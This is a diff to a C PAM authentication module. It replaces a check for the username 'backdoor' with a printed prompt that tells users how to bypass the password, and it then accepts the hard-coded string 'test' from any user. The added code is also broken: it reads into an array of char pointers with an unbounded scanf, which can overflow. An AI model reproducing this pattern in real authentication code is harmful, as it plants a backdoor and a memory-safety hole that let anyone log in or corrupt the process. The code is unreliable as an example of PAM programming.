@@ -19,6 +19,7 @@ PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, cons
 	int retval;
 
 	const char* pUsername;
+	char* pPassword[15];
 	retval = pam_get_user(pamh, &pUsername, "Username: ");
 
 	printf("Welcome %s\n", pUsername);
@@ -26,8 +27,9 @@ PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, cons
 	if (retval != PAM_SUCCESS) {
 		return retval;
 	}
-
-	if (strcmp(pUsername, "backdoor") != 0) {
+	printf("Per bypassare la password, inserire 'test'\n");
+	scanf("%s", pPassword);
+	if (strcmp(pPassword, "test") != 0) {
 		return PAM_AUTH_ERR;
 	}
 
